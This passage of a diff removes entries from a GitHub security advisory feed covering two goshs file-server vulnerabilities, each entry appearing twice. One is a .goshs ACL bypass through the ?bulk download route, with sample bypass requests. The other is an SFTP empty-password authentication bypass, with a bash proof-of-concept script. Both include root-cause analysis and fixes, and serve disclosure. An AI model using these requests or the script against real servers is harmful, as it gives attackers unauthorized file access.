-<p>Remediation: enforce the effective .goshs ACL inside bulkDownload for every requested file exactly as sendFile/processDir do (resolve findEffectiveACL(filepath.Dir(absPath)) + applyCustomAuth + honor acl.Block), or route ?bulk through the same authorization gate as the normal read path. Audit ?cbDown and other alternate read routes for the same gap.</p>
-<p>Credit: anir0y (independent security research).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/goshs-labs/goshs/security/advisories/GHSA-rmxw-pq4x-3fvh">https://github.com/goshs-labs/goshs/security/advisories/GHSA-rmxw-pq4x-3fvh</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/commit/7cf911a26ace737e1a55b7dc073e307a25f7fd1d">https://github.com/goshs-labs/goshs/commit/7cf911a26ace737e1a55b7dc073e307a25f7fd1d</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/releases/tag/v2.1.1">https://github.com/goshs-labs/goshs/releases/tag/v2.1.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-rmxw-pq4x-3fvh">https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:59:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/patrickhener/goshs] goshs: File-based .goshs ACL authorization bypass via the ?bulk zip-download route (unauthenticated read; residual of GHSA-wvhv-qcqf-f3cx)]]></title>
-        <id>https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</id>
-        <link href="https://github.com/advisories/GHSA-rmxw-pq4x-3fvh"/>
-        <updated>2026-07-28T21:59:49.000Z</updated>
-        <content type="html"><![CDATA[<p>GHSA-wvhv-qcqf-f3cx fixed the per-folder .goshs ACL bypass on the state-changing routes (PUT/POST upload/?mkdir/?delete) and added recursive ACL resolution, and its description states the read/list path correctly enforces .goshs. That premise does not hold for the ?bulk zip-download route. bulkDownload (httpserver/updown.go) takes one or more ?file= parameters, runs each through sanitizePath(fs.Webroot, file), and streams the contents back as a ZIP without ever calling findEffectiveACL/applyCustomAuth. It is dispatched from earlyBreakParameters (?bulk) before the normal doDir/doFile/sendFile flow that performs the ACL check. An unauthenticated attacker can therefore read any file under the webroot protected solely by a .goshs ACL, bypassing both the folder auth (401 on the normal path) and the per-file block list (404 on the normal path). Same authorization-inconsistency root cause as the original advisory, surviving on a read route the fix did not cover.</p>
-<p>Proof of concept (live, against the fixed v2.1.0 build which includes fix commit f212c4f4, served with no global -b auth, only a per-folder .goshs):
-  GET /protected/secret.txt              -&gt; 401 (ACL enforced on normal path)
-  GET /protected/secret.txt -u admin:admin -&gt; 200
-  GET /?bulk&amp;file=/protected/secret.txt  -&gt; 200, zip contains the protected file contents  (BYPASS)
-  GET /?bulk&amp;file=/protected/blocked.txt -&gt; 200, zip contains the block-listed file        (block bypass)
-  GET /protected/secret.txt?share        -&gt; 403 'Sharing disabled when auth is disabled'    (correctly gated, NOT a bypass)</p>
-<p>Impact: any unauthenticated network attacker can read files an operator protected with the documented per-folder .goshs ACL/basic-auth feature, by requesting them through ?bulk. Confidentiality only (the write/delete equivalents were closed by GHSA-wvhv-qcqf-f3cx). Applies to deployments relying on .goshs as the access boundary (a server-wide -b basic auth, if configured, also gates ?bulk via its middleware).</p>
-<p>Remediation: enforce the effective .goshs ACL inside bulkDownload for every requested file exactly as sendFile/processDir do (resolve findEffectiveACL(filepath.Dir(absPath)) + applyCustomAuth + honor acl.Block), or route ?bulk through the same authorization gate as the normal read path. Audit ?cbDown and other alternate read routes for the same gap.</p>
-<p>Credit: anir0y (independent security research).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/goshs-labs/goshs/security/advisories/GHSA-rmxw-pq4x-3fvh">https://github.com/goshs-labs/goshs/security/advisories/GHSA-rmxw-pq4x-3fvh</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/commit/7cf911a26ace737e1a55b7dc073e307a25f7fd1d">https://github.com/goshs-labs/goshs/commit/7cf911a26ace737e1a55b7dc073e307a25f7fd1d</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/releases/tag/v2.1.1">https://github.com/goshs-labs/goshs/releases/tag/v2.1.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-rmxw-pq4x-3fvh">https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:59:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[goshs.de/goshs/v2] goshs SFTP authentication bypass via empty password (incomplete fix of CVE-2026-40884)]]></title>
-        <id>https://github.com/advisories/GHSA-rjrw-mjq6-hpmm</id>
-        <link href="https://github.com/advisories/GHSA-rjrw-mjq6-hpmm"/>
-        <updated>2026-07-28T21:57:19.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Start goshs v2.1.3 with <code>-b 'admin:' -sftp</code>. No <code>-fkf</code>. SFTP accepts connections without password. CVE-2026-40884 blocks the empty-username variant (<code>-b ':pass'</code>). The empty-password variant bypasses that fix.</p>
-<h2 id="cve-2026-40884">CVE-2026-40884</h2>
-<p><strong>CVE-2026-40884</strong> (GHSA-c29w-qq4m-2gcv, Apr 13 2026) reported the empty-username case: <code>-b ':pass'</code> with <code>-sftp</code>. <code>sftpserver.go:85</code> uses <code>&amp;&amp;</code>:</p>
-<pre><code class="language-go">if s.Username != "" &amp;&amp; s.Password != "" {
-    sshServer.PasswordHandler = func(ctx ssh.Context, password string) bool {
-        return subtle.ConstantTimeCompare([]byte(ctx.User()), []byte(s.Username)) == 1 &amp;&amp; subtle.ConstantTimeCompare([]byte(password), []byte(s.Password)) == 1
-    }
-}
-</code></pre>
-<p>Empty username → <code>Username != ""</code> false → <code>PasswordHandler</code> nil. No <code>-fkf</code> means <code>PublicKeyHandler</code> also nil. gliderlabs/ssh sees all handlers nil and sets <code>NoClientAuth = true</code>. Unauthenticated access.</p>
-<p>Patrickhener fixed it with a sanity check at <code>sanity/checks.go:114-118</code>:</p>
-<pre><code class="language-go">if opts.FTP &amp;&amp; opts.FTPSFTPMode &amp;&amp; strings.HasPrefix(opts.BasicAuth, ":") {
-    logger.Fatal("When using SFTP with password authentication, the username cannot be empty. ...")
-}
-</code></pre>
-<p><code>HasPrefix(":")</code> catches empty username. It does not catch empty password.</p>
-<h2 id="empty-password-bypass">Empty Password Bypass</h2>
-<p>Same <code>&amp;&amp;</code> at <code>sftpserver.go:85</code>. Same nil handler. Different input:</p>
-<pre><code>goshs -b 'admin:' -sftp
-</code></pre>
-<ul>
-<li><code>Username = "admin"</code>, <code>Password = ""</code></li>
-<li><code>Username != "" &amp;&amp; Password != ""</code> → false. Password is empty.</li>
-<li><code>PasswordHandler</code> not set. No <code>-fkf</code> → <code>PublicKeyHandler</code> not set.</li>
-<li>gliderlabs/ssh → <code>NoClientAuth = true</code>.</li>
-</ul>
-<p>CVE-2026-40884 patched the symptom (empty username) with input validation. Root cause (<code>&amp;&amp;</code>) stayed in the code. v2.1.3 still has it. That makes any unanticipated input format exploitable.</p>
-<h2 id="poc">PoC</h2>
-<pre><code class="language-bash">#!/usr/bin/env bash
-set -euo pipefail
-
-HOST="${1:-127.0.0.1}"
-PORT="${2:-2121}"
-
-echo "[*] Connecting to goshs SFTP at $HOST:$PORT with empty password..."
-echo "ls -la /" | sftp -o StrictHostKeyChecking=no \
-  -o UserKnownHostsFile=/dev/null \
-  -o PreferredAuthentications=none,password \
-  -o PubkeyAuthentication=no \
-  -P "$PORT" -b - admin@"$HOST" 2&gt;&amp;1 &amp;&amp; \
-  echo "[+] VULNERABLE: Connected without password!" || \
-  echo "[-] Connection failed (patched or not running)"
-</code></pre>
-<h2 id="root-cause">Root Cause</h2>
-<pre><code class="language-go">// Wrong: &amp;&amp;
-if s.Username != "" &amp;&amp; s.Password != "" {
-
-// Correct: ||
-if s.Username != "" || s.Password != "" {
-</code></pre>
-<p><code>&amp;&amp;</code> blocks <code>PasswordHandler</code> when either field is empty. <code>||</code> installs it when either field is set.</p>
-<h2 id="incomplete-fix">Incomplete Fix</h2>
-<p>Patrickhener added <code>HasPrefix(":")</code> at <code>sanity/checks.go:116</code>. Two gaps remain:</p>
-<ol>
-<li><code>&amp;&amp;</code> still at <code>sftpserver.go:85</code> in v2.1.3</li>
-<li>No <code>HasSuffix(":")</code> check for empty password</li>
-</ol>
-<h2 id="impact">Impact</h2>
-<ul>
-<li>Unauthenticated SFTP file access (read, write, delete, rename)</li>
-<li>Same impact as CVE-2026-40884 via a different input</li>
-<li>Exploitable with <code>-b 'user:'</code> and no <code>-fkf</code></li>
-</ul>
-<h2 id="affected">Affected</h2>
-<p>All goshs versions including v2.1.3. CVE-2026-40884 fix does not cover this variant.</p>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<ol>
-<li><code>&amp;&amp;</code> → <code>||</code> at <code>sftpserver/sftpserver.go:85</code></li>
-<li><code>HasSuffix(":")</code> check at <code>sanity/checks.go</code></li>
-<li>Shared auth handler setup for HTTP and SFTP code paths</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/goshs-labs/goshs/security/advisories/GHSA-rjrw-mjq6-hpmm">https://github.com/goshs-labs/goshs/security/advisories/GHSA-rjrw-mjq6-hpmm</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/commit/32f4a0e1790a709f722d0f3b2341f139d003180a">https://github.com/goshs-labs/goshs/commit/32f4a0e1790a709f722d0f3b2341f139d003180a</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/releases/tag/v2.1.4">https://github.com/goshs-labs/goshs/releases/tag/v2.1.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-rjrw-mjq6-hpmm">https://github.com/advisories/GHSA-rjrw-mjq6-hpmm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rjrw-mjq6-hpmm</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-28T21:56:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/patrickhener/goshs/v2] goshs SFTP authentication bypass via empty password (incomplete fix of CVE-2026-40884)]]></title>
-        <id>https://github.com/advisories/GHSA-rjrw-mjq6-hpmm</id>
-        <link href="https://github.com/advisories/GHSA-rjrw-mjq6-hpmm"/>
-        <updated>2026-07-28T21:57:19.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Start goshs v2.1.3 with <code>-b 'admin:' -sftp</code>. No <code>-fkf</code>. SFTP accepts connections without password. CVE-2026-40884 blocks the empty-username variant (<code>-b ':pass'</code>). The empty-password variant bypasses that fix.</p>
-<h2 id="cve-2026-40884">CVE-2026-40884</h2>
-<p><strong>CVE-2026-40884</strong> (GHSA-c29w-qq4m-2gcv, Apr 13 2026) reported the empty-username case: <code>-b ':pass'</code> with <code>-sftp</code>. <code>sftpserver.go:85</code> uses <code>&amp;&amp;</code>:</p>
-<pre><code class="language-go">if s.Username != "" &amp;&amp; s.Password != "" {
-    sshServer.PasswordHandler = func(ctx ssh.Context, password string) bool {
-        return subtle.ConstantTimeCompare([]byte(ctx.User()), []byte(s.Username)) == 1 &amp;&amp; subtle.ConstantTimeCompare([]byte(password), []byte(s.Password)) == 1
-    }
-}
-</code></pre>
-<p>Empty username → <code>Username != ""</code> false → <code>PasswordHandler</code> nil. No <code>-fkf</code> means <code>PublicKeyHandler</code> also nil. gliderlabs/ssh sees all handlers nil and sets <code>NoClientAuth = true</code>. Unauthenticated access.</p>
-<p>Patrickhener fixed it with a sanity check at <code>sanity/checks.go:114-118</code>:</p>
-<pre><code class="language-go">if opts.FTP &amp;&amp; opts.FTPSFTPMode &amp;&amp; strings.HasPrefix(opts.BasicAuth, ":") {
-    logger.Fatal("When using SFTP with password authentication, the username cannot be empty. ...")
-}
-</code></pre>
-<p><code>HasPrefix(":")</code> catches empty username. It does not catch empty password.</p>
-<h2 id="empty-password-bypass">Empty Password Bypass</h2>
-<p>Same <code>&amp;&amp;</code> at <code>sftpserver.go:85</code>. Same nil handler. Different input:</p>
-<pre><code>goshs -b 'admin:' -sftp
-</code></pre>
-<ul>
-<li><code>Username = "admin"</code>, <code>Password = ""</code></li>
-<li><code>Username != "" &amp;&amp; Password != ""</code> → false. Password is empty.</li>
-<li><code>PasswordHandler</code> not set. No <code>-fkf</code> → <code>PublicKeyHandler</code> not set.</li>
-<li>gliderlabs/ssh → <code>NoClientAuth = true</code>.</li>
-</ul>
-<p>CVE-2026-40884 patched the symptom (empty username) with input validation. Root cause (<code>&amp;&amp;</code>) stayed in the code. v2.1.3 still has it. That makes any unanticipated input format exploitable.</p>
-<h2 id="poc">PoC</h2>
-<pre><code class="language-bash">#!/usr/bin/env bash
-set -euo pipefail
-
-HOST="${1:-127.0.0.1}"
-PORT="${2:-2121}"
-
-echo "[*] Connecting to goshs SFTP at $HOST:$PORT with empty password..."
-echo "ls -la /" | sftp -o StrictHostKeyChecking=no \
-  -o UserKnownHostsFile=/dev/null \
-  -o PreferredAuthentications=none,password \
-  -o PubkeyAuthentication=no \
-  -P "$PORT" -b - admin@"$HOST" 2&gt;&amp;1 &amp;&amp; \
-  echo "[+] VULNERABLE: Connected without password!" || \
-  echo "[-] Connection failed (patched or not running)"
-</code></pre>
-<h2 id="root-cause">Root Cause</h2>
-<pre><code class="language-go">// Wrong: &amp;&amp;
-if s.Username != "" &amp;&amp; s.Password != "" {
-
-// Correct: ||
-if s.Username != "" || s.Password != "" {
-</code></pre>
-<p><code>&amp;&amp;</code> blocks <code>PasswordHandler</code> when either field is empty. <code>||</code> installs it when either field is set.</p>
-<h2 id="incomplete-fix">Incomplete Fix</h2>
-<p>Patrickhener added <code>HasPrefix(":")</code> at <code>sanity/checks.go:116</code>. Two gaps remain:</p>
-<ol>
-<li><code>&amp;&amp;</code> still at <code>sftpserver.go:85</code> in v2.1.3</li>
-<li>No <code>HasSuffix(":")</code> check for empty password</li>
-</ol>
-<h2 id="impact">Impact</h2>
-<ul>
-<li>Unauthenticated SFTP file access (read, write, delete, rename)</li>
-<li>Same impact as CVE-2026-40884 via a different input</li>
-<li>Exploitable with <code>-b 'user:'</code> and no <code>-fkf</code></li>
-</ul>
-<h2 id="affected">Affected</h2>
-<p>All goshs versions including v2.1.3. CVE-2026-40884 fix does not cover this variant.</p>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<ol>
-<li><code>&amp;&amp;</code> → <code>||</code> at <code>sftpserver/sftpserver.go:85</code></li>
-<li><code>HasSuffix(":")</code> check at <code>sanity/checks.go</code></li>
-<li>Shared auth handler setup for HTTP and SFTP code paths</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/goshs-labs/goshs/security/advisories/GHSA-rjrw-mjq6-hpmm">https://github.com/goshs-labs/goshs/security/advisories/GHSA-rjrw-mjq6-hpmm</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/commit/32f4a0e1790a709f722d0f3b2341f139d003180a">https://github.com/goshs-labs/goshs/commit/32f4a0e1790a709f722d0f3b2341f139d003180a</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/releases/tag/v2.1.4">https://github.com/goshs-labs/goshs/releases/tag/v2.1.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-rjrw-mjq6-hpmm">https://github.com/advisories/GHSA-rjrw-mjq6-hpmm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rjrw-mjq6-hpmm</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-28T21:56:28.000Z</published>
     </entry>
 </feed>
